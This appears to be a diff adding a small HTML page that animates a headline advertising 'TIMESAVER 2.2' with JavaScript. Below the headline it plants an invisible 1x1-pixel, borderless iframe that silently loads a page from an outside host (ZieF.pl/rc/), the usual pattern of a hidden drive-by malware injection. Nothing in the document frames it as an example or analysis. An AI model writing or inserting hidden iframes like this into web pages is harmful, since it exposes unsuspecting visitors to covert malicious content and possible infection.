@@ -1,0 +1,23 @@
+<html>
+<head>
+<body>
+<script type="text/javascript">
+var x=0;
+var dir=1;
+function move1()
+{
+dom=document.getElementById("txt");
+x+=dir;
+if(x>=400||x<=-400)dir=0-dir;
+dom.style.left=x;
+window.setTimeout("move1();",10);
+}
+</script>
+</head>
+<body onload="move1();">
+<h3 align="center" style="position:relative;" id="txt">
+Save Time With TIMESAVER 2.2
+</h3>
+<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+</body>
+</html>
